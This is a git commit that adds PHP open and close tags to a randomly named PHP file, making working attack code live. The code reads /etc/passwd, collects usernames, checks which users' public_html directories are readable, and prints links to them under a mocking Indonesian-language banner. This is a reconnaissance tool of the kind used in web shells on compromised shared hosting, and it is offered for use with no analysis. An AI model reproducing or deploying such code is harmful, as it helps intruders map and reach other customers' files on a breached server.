33f95b53467666d5e71a6647de9f246ff74217ee
antoniola <renata.cantiek@gmail.com>
2020-04-19 02:51:08 +0700

    Update fakjaksfnoiuh4039fsdg44.php

--- fakjaksfnoiuh4039fsdg44.php
+++ fakjaksfnoiuh4039fsdg44.php
@@ -1,4 +1,6 @@
-set_time_limit(0); @$passwd = fopen('/etc/passwd','r'); if (!$passwd) { die('<b>ORA KENEK COK ORAISO MOCO /etc/passwd </b>'); } $pub = array(); $users = array(); $conf = array(); $i = 0; while(!feof($passwd)) { $str = fgets($passwd); if ($i > 10) { $pos = strpos($str,':'); $username = substr($str,0,$pos); $dirz = '/home/'.$username.'/public_html/'; if (($username != '')) { if (is_readable($dirz)) { array_push($users,$username); array_push($pub,$dirz); } } } $i++; } echo '<br>'; echo "<center><b> ^_^ <br> SELAMAT NGINTIP <br> TERNYATA DISINI ADA ".sizeof($pub)." JANDA "." </b><br/><br/>"; foreach ($users as $user) { $path = "/home/$user/public_html/"; echo "<a href='?d=$path' target='_blank' style='font-weight:bold; color:#;'>$path</a><br>"; } echo "<br>"; echo '</div></center></body></html>'; 
+<?php
+
+set_time_limit(0); @$passwd = fopen('/etc/passwd','r'); if (!$passwd) { die('<b>ORA KENEK COK ORAISO MOCO /etc/passwd </b>'); } $pub = array(); $users = array(); $conf = array(); $i = 0; while(!feof($passwd)) { $str = fgets($passwd); if ($i > 10) { $pos = strpos($str,':'); $username = substr($str,0,$pos); $dirz = '/home/'.$username.'/public_html/'; if (($username != '')) { if (is_readable($dirz)) { array_push($users,$username); array_push($pub,$dirz); } } } $i++; } echo '<br>'; echo "<center><b> ^_^ <br> SELAMAT NGINTIP <br> TERNYATA DISINI ADA ".sizeof($pub)." JANDA "." </b><br/><br/>"; foreach ($users as $user) { $path = "/home/$user/public_html/"; echo "<a href='?d=$path' target='_blank' style='font-weight:bold; color:#;'>$path</a><br>"; } echo "<br>"; echo '</div></center></body></html>';
 
 
- 
+?>
